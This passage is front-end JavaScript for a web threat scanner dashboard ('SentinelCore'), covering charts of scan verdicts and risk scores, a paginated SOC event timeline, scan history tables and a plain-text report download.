      threatChartInstance = new Chart(ctx, {
        type: "doughnut",
        data: {
          labels: ["Safe", "Suspicious", "Malicious"],
          datasets: [
            {
              data: [safeCount, suspiciousCount, maliciousCount],
              backgroundColor: ["#10B981", "#F59E0B", "#EF4444"],
              borderColor: "#111B2D",
              borderWidth: 3,
              hoverOffset: 6
            }
          ]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          layout: {
            padding: 18
          },
          plugins: {
            legend: { display: false },
            tooltip: {
              position: Chart.Tooltip.positioners.donutOutside ? "donutOutside" : "nearest",
              caretPadding: 8,
              backgroundColor: "#0A101F",
              titleColor: "#F8FAFC",
              bodyColor: "#CBD5E1",
              borderColor: "#00B8F0",
              borderWidth: 1,
              padding: 10,
              usePointStyle: true,
              callbacks: {
                label: (context) => {
                  const val = context.parsed;
                  const pct = Math.round((val / total) * 100);
                  return ` ${context.label}: ${val} target${val === 1 ? "" : "s"} (${pct}%)`;
                }
              }
            }
          },
          cutout: "74%"
        }
      });
    }
  } else {
    renderSvgDonutFallback(safeCount, suspiciousCount, maliciousCount, total, fallbackContainer, canvas);
  }
}

// Helper to extract concise clock time from locale timestamp string
function formatShortTimestamp(timeStr) {
  if (!timeStr) return "--:--";
  const match = String(timeStr).match(/(\d{1,2}:\d{2})(?::\d{2})?\s*(AM|PM)?/i);
  if (match) {
    return match[2] ? `${match[1]} ${match[2].toUpperCase()}` : match[1];
  }
  return String(timeStr).slice(-8);
}

// ================= SESSION RISK ACTIVITY TIMELINE CHART =================
function updateActivityTimelineChart(history) {
  const emptyState = document.getElementById("activityChartEmpty");
  const wrapper = document.getElementById("activityChartWrapper");
  const canvas = document.getElementById("activityChartCanvas");
  const avgBadge = document.getElementById("avgRiskBadge");
  const countBadge = document.getElementById("activityScanCount");

  // Chronological order (oldest -> newest, up to latest 15 real scans)
  const chronological = [...history].reverse().slice(-15);

  if (countBadge) {
    countBadge.innerText = `${chronological.length} SCAN${chronological.length === 1 ? "" : "S"}`;
  }

  if (chronological.length === 0) {
    activityChartMeta = [];
    if (emptyState) emptyState.style.display = "flex";
    if (wrapper) wrapper.style.display = "none";
    if (avgBadge) avgBadge.innerText = "AVG: -- / 100";
    return;
  }

  if (emptyState) emptyState.style.display = "none";
  if (wrapper) wrapper.style.display = "block";

  activityChartMeta = chronological.map((item, idx) => {
    const score = (item.fullData && typeof item.fullData.risk?.riskScore === "number")
      ? item.fullData.risk.riskScore
      : ((item.verdict || item.severity || "").toUpperCase() === "MALICIOUS" ? 80
        : (item.verdict || item.severity || "").toUpperCase() === "SUSPICIOUS" ? 40 : 0);

    const verdict = (item.verdict || item.fullData?.risk?.verdict || item.severity || "SAFE").toUpperCase();
    const severity = (item.severity || item.fullData?.risk?.severity || "LOW").toUpperCase();
    const threatCount = item.fullData?.risk?.threatCount ?? (item.fullData?.risk?.scoredThreats?.length || 0);
    const shortTime = formatShortTimestamp(item.time);

    let shortTarget = item.target || `Scan #${idx + 1}`;
    try {
      if (shortTarget.startsWith("http")) {
        shortTarget = new URL(shortTarget).hostname.replace(/^www\./, "").slice(0, 15);
      } else if (shortTarget.startsWith("HTML Source")) {
        shortTarget = `HTML #${idx + 1}`;
      } else {
        shortTarget = shortTarget.slice(0, 14);
      }
    } catch (_) {
      shortTarget = shortTarget.slice(0, 14);
    }

    return {
      fullTarget: item.target || `Scan #${idx + 1}`,
      shortLabel: `${shortTime} · ${shortTarget}`,
      time: item.time || "--",
      verdict,
      severity,
      score,
      threatCount
    };
  });

  const labels = activityChartMeta.map(m => m.shortLabel);
  const scores = activityChartMeta.map(m => m.score);
  const pointColors = activityChartMeta.map(m => {
    if (m.verdict === "MALICIOUS" || m.verdict === "HIGH") return "#EF4444";
    if (m.verdict === "SUSPICIOUS" || m.verdict === "MEDIUM") return "#F59E0B";
    if (m.verdict === "INCONCLUSIVE") return "#94A3B8";
    return "#10B981";
  });

  const avgScore = Math.round(scores.reduce((a, b) => a + b, 0) / scores.length);
  if (avgBadge) avgBadge.innerText = `AVG: ${avgScore} / 100`;

  if (typeof Chart !== "undefined" && canvas) {
    if (activityChartInstance) {
      activityChartInstance.data.labels = labels;
      activityChartInstance.data.datasets[0].data = scores;
      activityChartInstance.data.datasets[0].pointBackgroundColor = pointColors;
      activityChartInstance.update();
    } else {
      const ctx = canvas.getContext("2d");
      const gradient = ctx.createLinearGradient(0, 0, 0, 220);
      gradient.addColorStop(0, "rgba(0, 184, 240, 0.28)");
      gradient.addColorStop(1, "rgba(0, 184, 240, 0.0)");

      activityChartInstance = new Chart(ctx, {
        type: "line",
        data: {
          labels,
          datasets: [
            {
              label: "Risk Score",
              data: scores,
              borderColor: "#00B8F0",
              backgroundColor: gradient,
              borderWidth: 2,
              fill: true,
              tension: 0.3,
              pointRadius: 5.5,
              pointHoverRadius: 8,
              pointHitRadius: 16,
              pointBackgroundColor: pointColors,
              pointBorderColor: "#080D19",
              pointBorderWidth: 2
            }
          ]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          interaction: {
            mode: "index",
            intersect: false
          },
          plugins: {
            legend: { display: false },
            tooltip: {
              backgroundColor: "#0A101F",
              titleColor: "#F8FAFC",
              bodyColor: "#CBD5E1",
              borderColor: "#00B8F0",
              borderWidth: 1,
              padding: 12,
              displayColors: true,
              usePointStyle: true,
              callbacks: {
                title: (items) => {
                  if (!items || !items.length) return "";
                  const meta = activityChartMeta[items[0].dataIndex];
                  if (!meta) return items[0].label;
                  return meta.fullTarget.length > 48
                    ? meta.fullTarget.slice(0, 48) + "..."
                    : meta.fullTarget;
                },
                label: (ctx) => {
                  const meta = activityChartMeta[ctx.dataIndex];
                  if (!meta) return ` Risk Score: ${ctx.parsed.y} / 100`;
                  return ` Score: ${meta.score} / 100 (${meta.severity})`;
                },
                afterLabel: (ctx) => {
                  const meta = activityChartMeta[ctx.dataIndex];
                  if (!meta) return [];
                  return [
                    ` Verdict: ${meta.verdict}`,
                    ` Threats: ${meta.threatCount}`,
                    ` Time: ${meta.time}`
                  ];
                }
              }
            }
          },
          scales: {
            y: {
              min: 0,
              max: 100,
              ticks: {
                stepSize: 25,
                color: "#64748B",
                font: { family: "'JetBrains Mono', monospace", size: 10.5 }
              },
              grid: {
                color: "rgba(255, 255, 255, 0.05)"
              },
              border: { display: false }
            },
            x: {
              ticks: {
                color: "#64748B",
                font: { family: "'JetBrains Mono', monospace", size: 10 },
                maxRotation: 20,
                autoSkip: true,
                maxTicksLimit: 7
              },
              grid: { display: false },
              border: { display: false }
            }
          }
        }
      });
    }
  }
}

// ================= SOC EVENT MANAGEMENT & TIMELINE STREAM =================
let currentSocTimelinePage = 1;
const currentSocTimelineLimit = 6;
let currentSocTimelineVerdict = "";
let currentSocTimelineTotalPages = 1;
let isSocTimelineLoading = false;
let socTimelineInitialized = false;

function initSocTimelineControls() {
  if (socTimelineInitialized) return;
  socTimelineInitialized = true;

  const filterEl = document.getElementById("timelineVerdictFilter");
  if (filterEl) {
    filterEl.addEventListener("change", (e) => {
      currentSocTimelineVerdict = e.target.value;
      currentSocTimelinePage = 1;
      fetchSocTimelineEvents();
    });
  }

  const refreshBtn = document.getElementById("timelineRefreshBtn");
  if (refreshBtn) {
    refreshBtn.addEventListener("click", () => {
      fetchSocTimelineEvents();
    });
  }

  const retryBtn = document.getElementById("timelineRetryBtn");
  if (retryBtn) {
    retryBtn.addEventListener("click", () => {
      fetchSocTimelineEvents();
    });
  }

  const prevBtn = document.getElementById("timelinePrevBtn");
  if (prevBtn) {
    prevBtn.addEventListener("click", () => {
      if (currentSocTimelinePage > 1) {
        currentSocTimelinePage--;
        fetchSocTimelineEvents();
      }
    });
  }

  const nextBtn = document.getElementById("timelineNextBtn");
  if (nextBtn) {
    nextBtn.addEventListener("click", () => {
      if (currentSocTimelinePage < currentSocTimelineTotalPages) {
        currentSocTimelinePage++;
        fetchSocTimelineEvents();
      }
    });
  }
}

async function fetchSocTimelineEvents() {
  const loadingEl = document.getElementById("threatTimelineLoading");
  const errorEl = document.getElementById("threatTimelineError");
  const emptyEl = document.getElementById("threatTimelineEmpty");
  const listEl = document.getElementById("threatTimelineList");
  const paginationEl = document.getElementById("threatTimelinePagination");
  const countTag = document.getElementById("timelineCountTag");

  if (!listEl) return;

  isSocTimelineLoading = true;

  // 1. Loading State
  if (loadingEl) loadingEl.style.display = "flex";
  if (errorEl) errorEl.style.display = "none";
  if (emptyEl) emptyEl.style.display = "none";
  if (listEl) listEl.style.display = "none";
  if (paginationEl) paginationEl.style.display = "none";

  const apiHost = "http://localhost:3000";
  const params = new URLSearchParams({
    page: String(currentSocTimelinePage),
    limit: String(currentSocTimelineLimit),
    sort: "newest"
  });

  if (currentSocTimelineVerdict) {
    params.set("verdict", currentSocTimelineVerdict);
  }

  try {
    const res = await fetch(`${apiHost}/api/soc/events?${params.toString()}`);
    if (!res.ok) {
      throw new Error(`HTTP ${res.status}: ${res.statusText || "Service Unavailable"}`);
    }
    const data = await res.json();
    if (!data.success) {
      throw new Error(data.error || "SOC event retrieval failed");
    }

    renderSocTimelineEvents(data);
  } catch (err) {
    console.warn("SOC timeline fetch error:", err.message);

    // 2. Error State
    if (loadingEl) loadingEl.style.display = "none";
    if (emptyEl) emptyEl.style.display = "none";
    if (listEl) listEl.style.display = "none";
    if (paginationEl) paginationEl.style.display = "none";
    if (errorEl) {
      errorEl.style.display = "flex";
      const msgEl = document.getElementById("timelineErrorMsg");
      if (msgEl) msgEl.textContent = `Endpoint /api/soc/events unreachable (${err.message}).`;
    }
    if (countTag) countTag.innerText = "OFFLINE";
  } finally {
    isSocTimelineLoading = false;
    refreshIcons();
  }
}

function renderSocTimelineEvents(data) {
  const loadingEl = document.getElementById("threatTimelineLoading");
  const errorEl = document.getElementById("threatTimelineError");
  const emptyEl = document.getElementById("threatTimelineEmpty");
  const listEl = document.getElementById("threatTimelineList");
  const paginationEl = document.getElementById("threatTimelinePagination");
  const countTag = document.getElementById("timelineCountTag");
  const pageInfoEl = document.getElementById("timelinePageInfo");
  const prevBtn = document.getElementById("timelinePrevBtn");
  const nextBtn = document.getElementById("timelineNextBtn");

  if (loadingEl) loadingEl.style.display = "none";
  if (errorEl) errorEl.style.display = "none";

  const events = Array.isArray(data?.events) ? data.events : [];
  const total = Number(data?.total || 0);
  const page = Number(data?.page || 1);
  const totalPages = Number(data?.totalPages || 1);

  currentSocTimelinePage = page;
  currentSocTimelineTotalPages = totalPages;

  if (countTag) {
    countTag.innerText = `${total} EVENT${total === 1 ? "" : "S"}`;
  }

  // 3. Empty State
  if (events.length === 0) {
    if (emptyEl) emptyEl.style.display = "flex";
    if (listEl) listEl.style.display = "none";
    if (paginationEl) paginationEl.style.display = "none";
    return;
  }

  // 4. Populated State
  if (emptyEl) emptyEl.style.display = "none";
  if (listEl) {
    listEl.style.display = "flex";
    listEl.innerHTML = "";

    events.forEach(ev => {
      const verdict = String(ev.verdict || "SAFE").toUpperCase();
      const score = typeof ev.riskScore === "number" ? ev.riskScore : "--";
      const threatCount = typeof ev.threatCount === "number" ? ev.threatCount : 0;
      const vClass =
        verdict === "MALICIOUS" ? "malicious" :
        verdict === "SUSPICIOUS" ? "suspicious" :
        verdict === "INCONCLUSIVE" ? "inconclusive" : "safe";

      const row = document.createElement("div");
      row.className = "timeline-item";
      row.title = `Event: ${ev.eventId || "SOC"} | Click to inspect full scan result`;
      row.onclick = () => loadSocEventItem(ev);

      const dot = document.createElement("span");
      dot.className = `timeline-dot ${vClass}`;

      const content = document.createElement("div");
      content.className = "timeline-content";

      const top = document.createElement("div");
      top.className = "timeline-top";

      const targetWrap = document.createElement("div");
      targetWrap.className = "timeline-target-wrap";

      const targetSpan = document.createElement("span");
      targetSpan.className = "timeline-target";
      targetSpan.textContent = ev.target || "Unknown Target";

      const eventIdSpan = document.createElement("span");
      eventIdSpan.className = "timeline-event-id";
      eventIdSpan.textContent = ev.eventId ? ev.eventId.slice(0, 11) : "sec";

      targetWrap.appendChild(targetSpan);
      targetWrap.appendChild(eventIdSpan);

      const scorePill = document.createElement("span");
      scorePill.className = `timeline-score-pill ${vClass}`;
      scorePill.textContent = `${score}/100`;

      top.appendChild(targetWrap);
      top.appendChild(scorePill);

      const meta = document.createElement("div");
      meta.className = "timeline-meta";

      const verdictTag = document.createElement("span");
      verdictTag.className = `timeline-verdict-tag ${vClass}`;
      verdictTag.textContent = `${verdict} • ${threatCount} threat${threatCount === 1 ? "" : "s"}`;

      const timeEl = document.createElement("span");
      timeEl.className = "timeline-time";
      const evDate = ev.timestamp ? new Date(ev.timestamp) : new Date();
      timeEl.textContent = isNaN(evDate.getTime()) ? "--" : evDate.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });

      meta.appendChild(verdictTag);
      meta.appendChild(timeEl);

      content.appendChild(top);
      content.appendChild(meta);

      row.appendChild(dot);
      row.appendChild(content);
      listEl.appendChild(row);
    });
  }

  // 5. Pagination State
  if (paginationEl) {
    if (totalPages > 1) {
      paginationEl.style.display = "flex";
      if (pageInfoEl) pageInfoEl.innerText = `Page ${page} of ${totalPages}`;
      if (prevBtn) prevBtn.disabled = page <= 1;
      if (nextBtn) nextBtn.disabled = page >= totalPages;
    } else {
      paginationEl.style.display = "none";
    }
  }
}

function loadSocEventItem(ev) {
  if (!ev) return;
  switchView("scanner");

  const isUrl = ev.targetType === "URL" || (typeof ev.target === "string" && /^https?:\/\//i.test(ev.target));
  const restoredInput = isUrl ? ev.target : (ev.rawInputPreview || "");
  const inputField = document.getElementById("inputData");

  if (isUrl) {
    setScanMode("url");
  } else {
    setScanMode("html");
  }

  if (inputField) {
    inputField.value = restoredInput;
  }

  const threatFindings = (ev.detectionEvidence || []).filter(e => e.isThreat);
  const infoFindings = (ev.detectionEvidence || []).filter(e => !e.isThreat);

  const syntheticData = {
    risk: {
      verdict: ev.verdict,
      severity: ev.severity,
      riskScore: ev.riskScore,
      scanCoverage: ev.scanCoverage,
      threatCount: ev.threatCount ?? threatFindings.length,
      infoCount: ev.infoCount ?? infoFindings.length,
      scoredThreats: threatFindings,
      evidenceFindings: ev.detectionEvidence || [],
      scoreExplanation: ev.remediation?.summary || "",
      factors: threatFindings.map(t => `${t.name} (+${t.scoreContribution || 0})`),
      remediation: ev.remediation || {}
    },
    analysis: {
      target: ev.target,
      totalScripts: ev.staticMetrics?.totalScripts || 0,
      totalIframes: ev.staticMetrics?.totalIframes || 0,
      hiddenElementsDetected: Boolean(ev.staticMetrics?.hiddenElementsDetected),
      findings: ev.detectionEvidence || [],
      metrics: ev.staticMetrics || {}
    },
    virusTotal: ev.virusTotal || { available: false, status: "unavailable" }
  };

  renderScanResult(ev.target, syntheticData, {
    rawInput: restoredInput,
    timestamp: ev.timestamp ? new Date(ev.timestamp).toLocaleString() : new Date().toLocaleString()
  });
}

function renderThreatActivityTimeline(history) {
  // Legacy session fallback helper
  const listEl = document.getElementById("threatTimelineList");
  const emptyEl = document.getElementById("threatTimelineEmpty");
  const countTag = document.getElementById("timelineCountTag");

  if (!listEl || !emptyEl) return;

  if (countTag) {
    countTag.innerText = `${history.length} EVENT${history.length === 1 ? "" : "S"}`;
  }

  listEl.innerHTML = "";

  if (!history || history.length === 0) {
    emptyEl.style.display = "flex";
    listEl.style.display = "none";
    return;
  }

  emptyEl.style.display = "none";
  listEl.style.display = "flex";

  history.slice(0, 10).forEach(item => {
    const verdict = (item.verdict || item.fullData?.risk?.verdict || item.severity || "SAFE").toUpperCase();
    const score = item.fullData?.risk?.riskScore ?? "--";
    const threatCount = item.fullData?.risk?.threatCount ?? (item.fullData?.risk?.scoredThreats?.length || 0);
    const vClass =
      verdict === "MALICIOUS" || verdict === "HIGH" ? "malicious" :
      verdict === "SUSPICIOUS" || verdict === "MEDIUM" ? "suspicious" :
      verdict === "INCONCLUSIVE" ? "inconclusive" : "safe";

    const row = document.createElement("div");
    row.className = "timeline-item";
    row.title = "Click to open full scan result";
    row.onclick = () => loadHistoryItem(item);

    const dot = document.createElement("span");
    dot.className = `timeline-dot ${vClass}`;

    const content = document.createElement("div");
    content.className = "timeline-content";

    const top = document.createElement("div");
    top.className = "timeline-top";

    const target = document.createElement("span");
    target.className = "timeline-target";
    target.textContent = item.target || "Unknown Target";

    const scorePill = document.createElement("span");
    scorePill.className = `timeline-score-pill ${vClass}`;
    scorePill.textContent = `${score}/100`;

    top.appendChild(target);
    top.appendChild(scorePill);

    const meta = document.createElement("div");
    meta.className = "timeline-meta";

    const verdictTag = document.createElement("span");
    verdictTag.className = `timeline-verdict-tag ${vClass}`;
    verdictTag.textContent = `${verdict} • ${threatCount} threat${threatCount === 1 ? "" : "s"}`;

    const timeEl = document.createElement("span");
    timeEl.textContent = item.time || "--";

    meta.appendChild(verdictTag);
    meta.appendChild(timeEl);

    content.appendChild(top);
    content.appendChild(meta);

    row.appendChild(dot);
    row.appendChild(content);
    listEl.appendChild(row);
  });
}

function renderSvgDonutFallback(safe, susp, mal, total, container, canvas) {
  if (canvas) canvas.style.display = "none";
  if (!container) return;

  container.style.display = "flex";
  const r = 50;
  const c = 2 * Math.PI * r;

  const safeDash = (safe / total) * c;
  const suspDash = (susp / total) * c;
  const malDash = (mal / total) * c;

  const safeOffset = 0;
  const suspOffset = -safeDash;
  const malOffset = -(safeDash + suspDash);

  container.innerHTML = `
    <svg width="140" height="140" viewBox="0 0 140 140" style="transform: rotate(-90deg);">
      <circle cx="70" cy="70" r="${r}" fill="none" stroke="#1E293B" stroke-width="18" />
      <circle cx="70" cy="70" r="${r}" fill="none" stroke="#10B981" stroke-width="18"
        stroke-dasharray="${safeDash} ${c - safeDash}" stroke-dashoffset="${safeOffset}" />
      <circle cx="70" cy="70" r="${r}" fill="none" stroke="#F59E0B" stroke-width="18"
        stroke-dasharray="${suspDash} ${c - suspDash}" stroke-dashoffset="${suspOffset}" />
      <circle cx="70" cy="70" r="${r}" fill="none" stroke="#EF4444" stroke-width="18"
        stroke-dasharray="${malDash} ${c - malDash}" stroke-dashoffset="${malOffset}" />
    </svg>
  `;
}

// ================= RENDER RECENT & FULL HISTORY TABLES =================
function renderDashboardRecentTable(recentList) {
  const tbody = document.getElementById("dashboardRecentTableBody");
  const emptyBox = document.getElementById("dashboardTableEmpty");

  if (!tbody) return;
  tbody.innerHTML = "";

  if (!recentList || recentList.length === 0) {
    if (emptyBox) emptyBox.style.display = "flex";
    return;
  }

  if (emptyBox) emptyBox.style.display = "none";

  recentList.forEach((item, index) => {
    tbody.appendChild(createHistoryTableRow(item, index));
  });
}

function renderFullHistoryTable() {
  const history = JSON.parse(sessionStorage.getItem("scanHistory")) || [];
  const tbody = document.getElementById("historyTableBody");
  const emptyState = document.getElementById("fullHistoryEmpty");
  const searchInput = document.getElementById("historySearchInput");
  const searchTerm = searchInput ? searchInput.value.toLowerCase().trim() : "";

  if (!tbody) return;
  tbody.innerHTML = "";

  const filtered = history.filter(item => {
    const verdictUpper = (item.verdict || item.severity || "SAFE").toUpperCase();
    const severityMatch =
      currentHistoryFilter === "ALL" ||
      verdictUpper === currentHistoryFilter ||
      (currentHistoryFilter === "SAFE" && (verdictUpper === "LOW" || verdictUpper === "SAFE")) ||
      (currentHistoryFilter === "SUSPICIOUS" && (verdictUpper === "MEDIUM" || verdictUpper === "SUSPICIOUS")) ||
      (currentHistoryFilter === "MALICIOUS" && (verdictUpper === "HIGH" || verdictUpper === "MALICIOUS"));

    const searchMatch = !searchTerm ||
      (item.target || "").toLowerCase().includes(searchTerm) ||
      verdictUpper.toLowerCase().includes(searchTerm) ||
      (item.time || "").toLowerCase().includes(searchTerm);
    return severityMatch && searchMatch;
  });

  if (filtered.length === 0) {
    if (emptyState) emptyState.style.display = "flex";
    return;
  }

  if (emptyState) emptyState.style.display = "none";

  filtered.forEach((item, index) => {
    tbody.appendChild(createHistoryTableRow(item, index));
  });
}

function createHistoryTableRow(item, index) {
  const tr = document.createElement("tr");

  const verdictUpper = (item.verdict || item.severity || "SAFE").toUpperCase();
  const severityUpper = (item.severity || "LOW").toUpperCase();
  const isUrl = (item.target || "").startsWith("http");

  const tdTarget = document.createElement("td");
  const targetWrap = document.createElement("div");
  targetWrap.className = "table-target-wrap";

  const typeIcon = document.createElement("span");
  typeIcon.className = `target-type-icon ${isUrl ? "url" : "html"}`;
  typeIcon.innerHTML = isUrl
    ? `<i data-lucide="globe" class="icon-14"></i>`
    : `<i data-lucide="code-2" class="icon-14"></i>`;

  const targetText = document.createElement("span");
  targetText.className = "table-target-text";
  targetText.textContent = item.target || "Unknown Target";
  targetText.title = item.target || "";

  targetWrap.appendChild(typeIcon);
  targetWrap.appendChild(targetText);
  tdTarget.appendChild(targetWrap);

  const tdDate = document.createElement("td");
  tdDate.className = "table-date-cell";
  tdDate.textContent = item.time || "--";

  const tdSeverity = document.createElement("td");
  const badge = document.createElement("span");
  badge.className = `status-badge ${severityUpper.toLowerCase()}`;
  badge.innerText = severityUpper;
  tdSeverity.appendChild(badge);

  const tdStatus = document.createElement("td");
  const statusLabel = document.createElement("span");
  const verdictClass =
    verdictUpper === "SAFE" || verdictUpper === "LOW" ? "low" :
    verdictUpper === "SUSPICIOUS" || verdictUpper === "MEDIUM" ? "medium" :
    verdictUpper === "MALICIOUS" || verdictUpper === "HIGH" ? "high" : "inconclusive";

  statusLabel.className = `risk-status-text ${verdictClass}`;
  statusLabel.innerText = verdictUpper;
  tdStatus.appendChild(statusLabel);

  const tdAction = document.createElement("td");
  tdAction.className = "text-right";

  const actionBtn = document.createElement("button");
  actionBtn.className = "btn-table-action";
  actionBtn.innerHTML = `
    <i data-lucide="eye" class="icon-13"></i>
    <span>${item.fullData ? "View Result" : "Inspect Target"}</span>
  `;
  actionBtn.onclick = () => loadHistoryItem(item);

  tdAction.appendChild(actionBtn);

  tr.appendChild(tdTarget);
  tr.appendChild(tdDate);
  tr.appendChild(tdSeverity);
  tr.appendChild(tdStatus);
  tr.appendChild(tdAction);

  return tr;
}

function loadHistoryItem(item) {
  if (!item) return;

  switchView("scanner");

  const isUrl = typeof item.target === "string" && (item.target.startsWith("http://") || item.target.startsWith("https://"));
  const restoredInput = item.rawInput || (isUrl ? item.target : "");
  const inputField = document.getElementById("inputData");

  if (isUrl) {
    setScanMode("url");
  } else if (restoredInput) {
    setScanMode("html");
  }

  if (inputField) {
    inputField.value = restoredInput;
  }

  if (item.fullData) {
    renderScanResult(item.target, item.fullData, {
      rawInput: restoredInput,
      timestamp: item.time || new Date().toLocaleString()
    });
  } else {
    showSocAlert({
      icon: "info",
      title: "Historical Scan Record",
      text: `Target: ${item.target} | Verdict: ${item.verdict || item.severity} | Date: ${item.time}. Click 'Scan Website' to execute a fresh deep scan.`
    });
  }
}

function filterHistoryTable() {
  renderFullHistoryTable();
  refreshIcons();
}

function setHistoryFilter(severity) {
  currentHistoryFilter = severity;
  const pills = document.querySelectorAll(".filter-pill");
  pills.forEach(pill => {
    if (pill.getAttribute("data-filter") === severity) {
      pill.classList.add("active");
    } else {
      pill.classList.remove("active");
    }
  });
  renderFullHistoryTable();
  refreshIcons();
}

// ================= SEVERITY GUIDE & REPORT DOWNLOAD =================
function toggleSeverityGuide() {
  const content = document.getElementById("severityContent");
  const toggle = document.getElementById("severityToggle");

  if (!content || !toggle) return;

  if (content.style.display === "none") {
    content.style.display = "block";
    toggle.innerText = "−";
    if (typeof gsap !== "undefined") {
      gsap.fromTo(content, { opacity: 0, y: -6 }, { opacity: 1, y: 0, duration: 0.25, ease: "power2.out" });
    }
  } else {
    content.style.display = "none";
    toggle.innerText = "+";
  }

  if (lenisInstance) lenisInstance.resize();
}

function downloadReport() {
  const verdictEl = document.getElementById("securityVerdict");
  const severityEl = document.getElementById("severity");
  const riskScoreEl = document.getElementById("riskScore");
  const scanTimeEl = document.getElementById("scanTime");
  const coverageEl = document.getElementById("scanCoverageBadge");
  const scriptsEl = document.getElementById("scripts");
  const extResEl = document.getElementById("domExternalResources");
  const formsEl = document.getElementById("domFormsCount");
  const iframesEl = document.getElementById("iframes");
  const hiddenEl = document.getElementById("hidden");
  const passEl = document.getElementById("domPasswordFields");
  const handlersEl = document.getElementById("domEventHandlers");
  const payloadEl = document.getElementById("domPayloadSize");
  const keywordsEl = document.getElementById("keywords");
  const vtMaliciousEl = document.getElementById("vtMalicious");
  const vtSuspiciousEl = document.getElementById("vtSuspicious");
  const vtHarmlessEl = document.getElementById("vtHarmless");
  const vtUndetectedEl = document.getElementById("vtUndetected");
  const vtTotalEl = document.getElementById("vtTotalEngines");
  const vtRepEl = document.getElementById("vtReputation");
  const vtTsEl = document.getElementById("vtAnalysisTimestamp");
  const vtStatusNote = document.getElementById("vtStatusNote");

  const verdict = verdictEl ? verdictEl.textContent : "UNKNOWN";
  const severity = severityEl ? severityEl.textContent : "LOW";
  const riskScore = riskScoreEl ? riskScoreEl.textContent : "0";

  if (!verdict || !lastRenderedScanData) {
    showSocAlert({
      icon: "info",
      title: "No Report Available",
      text: "Please execute a target scan first before downloading an audit report."
    });
    return;
  }

  const scanData = lastRenderedScanData?.data || null;
  const scoredThreats = Array.isArray(scanData?.risk?.scoredThreats)
    ? scanData.risk.scoredThreats
    : [];
  const unifiedEntries = cachedEvidenceEntries && cachedEvidenceEntries.length > 0
    ? cachedEvidenceEntries
    : buildUnifiedEvidenceEntries(
        scanData?.risk?.evidenceFindings || scanData?.analysis?.findings || [],
        scoredThreats
      );

  const contributionsSection = scoredThreats.length > 0
    ? scoredThreats
        .map(
          (item, idx) =>
            `${idx + 1}. [+${item.scoreContribution || 0} pts] ${item.name || "Threat Signal"} (${item.severity || "LOW"} | ${item.source || "ENGINE"})` +
            (item.evidence ? `\n   Evidence: ${item.evidence}` : "")
        )
        .join("\n")
    : "No risk-scoring threat contributions were recorded.";

  const findingsSection = unifiedEntries.length > 0
    ? unifiedEntries
        .map((item, idx) => {
          const lines = [
            `${idx + 1}. [${item.severity || "INFO"}] ${item.name || "Security Observation"} (${item.category}) [+${item.scoreContribution || 0} pts]`
          ];
          if (item.explanation) lines.push(`   Detail:      ${item.explanation}`);
          if (item.evidence) lines.push(`   Evidence:    ${item.evidence}`);
          if (item.recommendedAction) lines.push(`   Remediation: ${item.recommendedAction}`);
          return lines.join("\n");
        })
        .join("\n\n")
    : "No specific threat indicators or diagnostic observations recorded.";

  const reportText = `
SentinelCore Web Threat Detection Report (Engine v2.1)
======================================================
Target: ${lastRenderedScanData?.target || document.getElementById("resultTargetValue")?.textContent || "Unknown"}
Scan Time: ${scanTimeEl ? scanTimeEl.textContent : ""}

EXECUTIVE SECURITY SUMMARY
--------------------------
Security Verdict: ${verdict}
Risk Severity:    ${severity}
Risk Score:       ${riskScore} / 100 (Evidence-Based Sum)
Scan Coverage:    ${coverageEl ? coverageEl.textContent : "Full Inspection"}

VIRUSTOTAL THREAT INTELLIGENCE
------------------------------
- Status:               ${vtStatusNote ? vtStatusNote.textContent : "N/A"}
- Analysis Timestamp:   ${vtTsEl ? vtTsEl.textContent : "N/A"}
- Malicious Detections: ${vtMaliciousEl ? vtMaliciousEl.textContent : "N/A"}
- Suspicious Flags:     ${vtSuspiciousEl ? vtSuspiciousEl.textContent : "N/A"}
- Harmless Engines:     ${vtHarmlessEl ? vtHarmlessEl.textContent : "N/A"}
- Undetected Engines:   ${vtUndetectedEl ? vtUndetectedEl.textContent : "N/A"}
- Total Engines:        ${vtTotalEl ? vtTotalEl.textContent : "N/A"}
- Community Reputation: ${vtRepEl ? vtRepEl.textContent : "N/A"}

STATIC DOM & HEURISTIC INSPECTION
---------------------------------
- Scripts Detected:          ${scriptsEl ? scriptsEl.textContent : "N/A"}
- External Resources:        ${extResEl ? extResEl.textContent : "N/A"}
- Forms Count:               ${formsEl ? formsEl.textContent : "N/A"}
- Hidden Elements:           ${hiddenEl ? hiddenEl.textContent : "N/A"}
- Iframes:                   ${iframesEl ? iframesEl.textContent : "N/A"}
- Password Fields:           ${passEl ? passEl.textContent : "N/A"}
- Suspicious Event Handlers: ${handlersEl ? handlersEl.textContent : "N/A"}
- DOM Payload Size:          ${payloadEl ? payloadEl.textContent : "N/A"}
- Observed Vocabulary:       ${keywordsEl ? keywordsEl.textContent : "None"}

THREAT SCORE CONTRIBUTIONS
--------------------------
${contributionsSection}

FINDINGS & REMEDIATION ACTIONS
------------------------------
${findingsSection}

Note:
This analysis is based on context-aware static HTML inspection and reputation checks.
No scripts were executed in the scanning sandbox.

Generated on: ${new Date().toLocaleString()}
`;

  const blob = new Blob([reportText], { type: "text/plain;charset=utf-8" });
  const link = document.createElement("a");
  const blobUrl = URL.createObjectURL(blob);
  link.href = blobUrl;
  link.download = "web_threat_scan_report.txt";
  link.click();
  setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
}

function renderHistory() {
  const history = JSON.parse(sessionStorage.getItem("scanHistory")) || [];
  const list = document.getElementById("historyList");
  const box = document.querySelector(".history");

  if (!list || !box) return;

  if (!history.length) {
    box.style.display = "none";
    return;
  }

  box.style.display = "block";
  list.innerHTML = "";
  history.forEach(h => {
    const li = document.createElement("li");
    li.textContent = `${h.time} | ${h.target} | ${h.verdict || h.severity}`;
    list.appendChild(li);
  });
}
